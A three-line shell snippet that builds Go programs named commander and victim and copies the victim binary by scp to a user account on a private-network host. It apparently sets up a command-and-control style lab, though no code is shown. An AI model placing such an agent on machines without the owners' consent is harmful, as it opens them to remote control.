go build commander.go
go build victim.go
scp ./victim tom@10.0.0.3:/home/tom
